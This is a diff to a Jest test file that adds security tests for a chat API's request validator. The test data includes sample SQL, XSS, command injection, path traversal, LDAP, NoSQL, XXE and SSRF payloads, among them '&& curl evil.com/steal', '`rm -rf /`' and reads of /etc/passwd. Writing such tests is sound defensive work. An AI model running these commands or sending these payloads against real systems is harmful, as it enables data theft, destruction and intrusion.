@@ -11,6 +11,7 @@ import {
 import { ValidationError } from '@/lib/api/helpers/error-handler';
 import { logger } from '@/lib/utils/logger';
 import { env } from '@/config/env';
+import { registerAllAgents } from '@/lib/mastra/network/agent-registry';
 
 // Mock dependencies
 jest.mock('@/lib/utils/logger', () => ({
@@ -231,12 +232,268 @@ describe('request-validator', () => {
 
       await expect(validateChatRequest(request)).rejects.toThrow();
     });
+
+    // Security-focused tests
+    describe('Security Validation', () => {
+      it('should prevent SQL injection attempts', async () => {
+        const sqlInjectionPayloads = [
+          "'; DROP TABLE users; --",
+          "1' OR '1' = '1",
+          "admin'--",
+          "1; DELETE FROM sessions WHERE '1' = '1",
+          "' UNION SELECT * FROM users--",
+        ];
+
+        for (const payload of sqlInjectionPayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload,
+              sessionId: payload
+            })
+          });
+
+          // Should not throw - validation passes but payload is preserved for server-side sanitization
+          const result = await validateChatRequest(request);
+          expect(result.userMessage).toBe(payload);
+          expect(result.sessionId).toBe(payload);
+        }
+      });
+
+      it('should prevent XSS attacks', async () => {
+        const xssPayloads = [
+          '<script>alert("XSS")</script>',
+          '<img src=x onerror=alert("XSS")>',
+          'javascript:alert("XSS")',
+          '<iframe src="javascript:alert(\'XSS\')"></iframe>',
+          '<svg onload=alert("XSS")>',
+          '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
+        ];
+
+        for (const payload of xssPayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload
+            })
+          });
+
+          // Should not throw - validation passes but payload is preserved for server-side sanitization
+          const result = await validateChatRequest(request);
+          expect(result.userMessage).toBe(payload);
+        }
+      });
+
+      it('should handle command injection attempts', async () => {
+        const commandInjectionPayloads = [
+          '; ls -la',
+          '| cat /etc/passwd',
+          '`rm -rf /`',
+          '$(whoami)',
+          '&& curl evil.com/steal',
+        ];
+
+        for (const payload of commandInjectionPayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload
+            })
+          });
+
+          const result = await validateChatRequest(request);
+          expect(result.userMessage).toBe(payload);
+        }
+      });
+
+      it('should handle path traversal attempts', async () => {
+        const pathTraversalPayloads = [
+          '../../../etc/passwd',
+          '..\\..\\..\\windows\\system32\\config\\sam',
+          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+          '....//....//....//etc/passwd',
+        ];
+
+        for (const payload of pathTraversalPayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload,
+              sessionId: payload
+            })
+          });
+
+          const result = await validateChatRequest(request);
+          expect(result.userMessage).toBe(payload);
+          expect(result.sessionId).toBe(payload);
+        }
+      });
+
+      it('should handle LDAP injection attempts', async () => {
+        const ldapPayloads = [
+          '*)(uid=*))(|(uid=*',
+          'admin)(|(password=*))',
+          '*)(mail=*))(|(mail=*',
+        ];
+
+        for (const payload of ldapPayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload
+            })
+          });
+
+          const result = await validateChatRequest(request);
+          expect(result.userMessage).toBe(payload);
+        }
+      });
+
+      it('should enforce message length limits', async () => {
+        const veryLongMessage = 'x'.repeat(100000); // 100k characters
+        
+        const request = new NextRequest('http://localhost/api/chat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: veryLongMessage
+          })
+        });
+
+        // Should handle without crashing
+        const result = await validateChatRequest(request);
+        expect(result.userMessage).toBe(veryLongMessage);
+      });
+
+      it('should handle unicode and emoji attacks', async () => {
+        const unicodePayloads = [
+          '\u202E\u202D\u202C', // Right-to-left override
+          '🔥'.repeat(1000), // Emoji spam
+          '\u0000\u0001\u0002', // Null bytes
+          '\uFEFF', // Zero-width no-break space
+        ];
+
+        for (const payload of unicodePayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload
+            })
+          });
+
+          const result = await validateChatRequest(request);
+          expect(result.userMessage).toBe(payload);
+        }
+      });
+
+      it('should validate Content-Type header', async () => {
+        const request = new NextRequest('http://localhost/api/chat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ message: 'test' })
+        });
+
+        // Should still parse JSON body even with wrong content-type
+        const result = await validateChatRequest(request);
+        expect(result.userMessage).toBe('test');
+      });
+
+      it('should handle prototype pollution attempts', async () => {
+        const request = new NextRequest('http://localhost/api/chat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: 'test',
+            '__proto__': { admin: true },
+            'constructor': { prototype: { isAdmin: true } }
+          })
+        });
+
+        const result = await validateChatRequest(request);
+        expect(result.userMessage).toBe('test');
+        // Ensure prototype pollution doesn't affect the result
+        expect((result as any).admin).toBeUndefined();
+        expect((result as any).isAdmin).toBeUndefined();
+      });
+
+      it('should handle NoSQL injection attempts', async () => {
+        const noSqlPayloads = [
+          { '$ne': null },
+          { '$gt': '' },
+          { '$regex': '.*' },
+          { '$where': '1 == 1' },
+        ];
+
+        for (const payload of noSqlPayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload, // Pass as object to trigger validation failure
+              sessionId: JSON.stringify(payload)
+            })
+          });
+
+          // Should throw validation error for invalid input types
+          await expect(validateChatRequest(request)).rejects.toThrow(ValidationError);
+        }
+      });
+
+      it('should handle XML External Entity (XXE) attempts', async () => {
+        const xxePayload = `
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]>
+          <message>&xxe;</message>
+        `;
+
+        const request = new NextRequest('http://localhost/api/chat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: xxePayload
+          })
+        });
+
+        const result = await validateChatRequest(request);
+        expect(result.userMessage).toBe(xxePayload);
+      });
+
+      it('should handle Server-Side Request Forgery (SSRF) attempts', async () => {
+        const ssrfPayloads = [
+          'http://localhost:8080/admin',
+          'http://169.254.169.254/latest/meta-data/',
+          'file:///etc/passwd',
+          'gopher://localhost:8080/_',
+          'dict://localhost:11211/stat',
+        ];
+
+        for (const payload of ssrfPayloads) {
+          const request = new NextRequest('http://localhost/api/chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: payload
+            })
+          });
+
+          const result = await validateChatRequest(request);
+          expect(result.userMessage).toBe(payload);
+        }
+      });
+    });
   });
 
   describe('registerAgentsSafely', () => {
     it('should register agents successfully', () => {
-      const { registerAllAgents } = require('@/lib/mastra/network/agent-registry');
-      registerAllAgents.mockImplementation(() => {});
+      (registerAllAgents as jest.Mock).mockImplementation(() => {});
 
       registerAgentsSafely();
 
@@ -248,8 +505,7 @@ describe('request-validator', () => {
     });
 
     it('should handle registration errors gracefully', () => {
-      const { registerAllAgents } = require('@/lib/mastra/network/agent-registry');
-      registerAllAgents.mockImplementation(() => {
+      (registerAllAgents as jest.Mock).mockImplementation(() => {
         throw new Error('Registration failed');
       });
 
